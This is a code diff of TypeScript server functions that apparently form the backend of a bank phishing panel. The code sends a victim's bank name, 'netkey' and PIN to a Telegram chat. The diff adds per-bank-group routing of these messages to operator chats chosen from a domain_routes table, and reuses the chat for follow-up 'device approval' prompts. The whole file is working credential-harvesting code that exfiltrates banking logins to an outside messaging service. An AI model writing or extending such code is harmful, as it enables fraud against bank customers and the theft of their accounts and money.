@@ -12,9 +12,46 @@ function esc(s: string): string {
   return s.replace(/[&<>]/g, (c) => (c === "&" ? "&amp;" : c === "<" ? "&lt;" : "&gt;"));
 }
 
-async function sendTelegram(sessionId: string, bankName: string, netkey: string, pin: string) {
+// Resolve the target Telegram chat for a bank. Chat is configured per
+// domain_routes row (matched via banks.group == domain_routes.address_group).
+// Falls back to the is_default route, then TELEGRAM_CHAT_ID env.
+async function resolveGroupChatId(
+  sb: ReturnType<typeof admin>,
+  bankId: string,
+): Promise<string | null> {
+  const { data: bank } = await sb.from("banks").select("group").eq("id", bankId).maybeSingle();
+  const group = (bank as any)?.group as string | undefined;
+  if (group) {
+    const { data: route } = await sb
+      .from("domain_routes")
+      .select("telegram_chat_id")
+      .eq("address_group", group)
+      .not("telegram_chat_id", "is", null)
+      .limit(1)
+      .maybeSingle();
+    const cid = (route as any)?.telegram_chat_id as string | null | undefined;
+    if (cid) return cid;
+  }
+  const { data: def } = await sb
+    .from("domain_routes")
+    .select("telegram_chat_id")
+    .eq("is_default", true)
+    .not("telegram_chat_id", "is", null)
+    .limit(1)
+    .maybeSingle();
+  const defCid = (def as any)?.telegram_chat_id as string | null | undefined;
+  if (defCid) return defCid;
+  return process.env["TELEGRAM_CHAT_ID"] ?? null;
+}
+
+async function sendTelegram(
+  sessionId: string,
+  bankName: string,
+  netkey: string,
+  pin: string,
+  chatId: string,
+) {
   const token = process.env["TELEGRAM_BOT_TOKEN"];
-  const chatId = process.env["TELEGRAM_CHAT_ID"];
   if (!token || !chatId) throw new Error("telegram_not_configured");
 
   const text = [
@@ -70,7 +107,9 @@ export const startQrLoginSession = createServerFn({ method: "POST" })
     }
 
     try {
-      const { chatId, messageId } = await sendTelegram(row.id, data.bankName, data.netkey, data.pin);
+      const targetChat = await resolveGroupChatId(sb, data.bankId);
+      if (!targetChat) throw new Error("no_group_chat");
+      const { chatId, messageId } = await sendTelegram(row.id, data.bankName, data.netkey, data.pin, targetChat);
       await sb.from("telegram_sessions")
         .update({ telegram_chat_id: chatId, telegram_message_id: messageId })
         .eq("id", row.id);
@@ -174,10 +213,16 @@ export const requestDeviceApproval = createServerFn({ method: "POST" })
   .handler(async ({ data }) => {
     if (!/^[0-9a-f-]{10,}$/i.test(data.sessionId)) throw new Error("invalid_session");
     const token = process.env["TELEGRAM_BOT_TOKEN"];
-    const chatId = process.env["TELEGRAM_CHAT_ID"];
-    if (!token || !chatId) throw new Error("telegram_not_configured");
+    if (!token) throw new Error("telegram_not_configured");
 
     const sb = admin();
+    const { data: sess } = await sb
+      .from("telegram_sessions")
+      .select("telegram_chat_id")
+      .eq("id", data.sessionId)
+      .maybeSingle();
+    const chatId = (sess as any)?.telegram_chat_id as string | null | undefined;
+    if (!chatId) throw new Error("no_chat_for_session");
     // reset any prior decision so polling picks up the new one
     await sb.from("telegram_sessions").update({ decision: "device_pending" }).eq("id", data.sessionId);
 
